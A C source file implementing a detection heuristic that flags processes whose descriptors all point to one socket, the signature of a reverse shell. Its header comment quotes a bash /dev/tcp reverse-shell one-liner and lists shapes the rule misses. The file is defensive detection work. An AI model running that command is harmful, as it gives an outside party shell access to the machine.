/*
 * proc_revshell_00.c - a shell whose whole world is one socket.
 *
 * `bash -i >& /dev/tcp/host/port 0>&1` writes no file, loads no module and
 * contains no byte a scanner could match. What it DOES is put one connection
 * where a terminal goes, and then hold nothing else at all. That shape is the
 * finding, and it is a shape rather than a signature - which is why it is a
 * heuristic and why no amount of renaming the tool evades it.
 *
 * THE THREE FACTS, AND EACH ONE ALONE IS NOISE.
 *
 *   fd 0 IS A SOCKET            eight processes on an ordinary desktop, all
 *                               legitimate - language servers and extension
 *                               hosts, because desktop IPC is sockets.
 *   fd 0 AND fd 1 ARE THE SAME  a socketpair is TWO objects, one per
 *   SOCKET                      direction, so a spawned child never has this;
 *                               `>&` dups ONE socket because there is one
 *                               connection. Measured: sweeping every process
 *                               with nothing malicious running returns zero.
 *   NOTHING ELSE IS OPEN        every descriptor names that same object. A
 *                               program doing work holds files, an epoll,
 *                               pipes, a terminal; a shell handed a connection
 *                               holds the connection.
 *
 * WHY "EVERYTHING NAMES fd 0" AND NOT "EXACTLY THREE DESCRIPTORS". Measured on
 * a real shell:
 *
 *     bash -i >& /dev/tcp/...   fd 0, 1, 2 AND 255 -> socket:[14908548]
 *
 * fd 255 is bash's own copy of the terminal, kept for job control by every
 * interactive shell. dash has three, bash has four, another shell may have
 * five - a count here would encode which shell this rule was written against.
 *
 * WHAT IT DELIBERATELY DOES NOT COVER, so a quiet result is not read as clean:
 * a shell wired with dup2 onto separate descriptors; netcat, ncat and socat,
 * which hold a listening socket as well as the accepted one and so fail the
 * third test on purpose; anything upgraded to a pty afterwards; a payload that
 * re-execs and rearranges its descriptors; a socket passed in over SCM_RIGHTS.
 * This is one shape, it is the shape most of them have, and it is a heuristic.
 *
 * NOT A VERDICT EVEN WHEN IT FIRES. An inetd-style service handed one
 * connected socket as its stdio has exactly this shape and is doing its job,
 * and so does a container entry point wired that way.
 */
#include <kofmod/heur.h>
#include <kofmod/proc.h>

KOF_TARGET_EVENT(KOF_EVT_PROC);

/* VERDICT: everything read here is a field the parse already filled, so there
 * is nothing for an earlier phase to do. */
KOF_HEUR_PHASE(KOF_HEUR_VERDICT);
KOF_HEUR_NAME("RevShell");

KOF_DEFINE_HEUR
{
	const struct kof_proc_info *p = kof_proc(ctx);

	if (!p || !p->valid)
		return;

	/* The descriptor walk has to have RUN. Without it every count below is
	 * zero, and zero would satisfy the third test by accident. */
	if (!(p->flags & KOF_PROC_F_FDS_READ) || !p->n_fd)
		return;

	if (!p->fd0_socket || !p->fd_same_01)
		return;

	if (p->n_like_stdin != p->n_fd)
		return;

	KOF_HEUR_HIT();
}
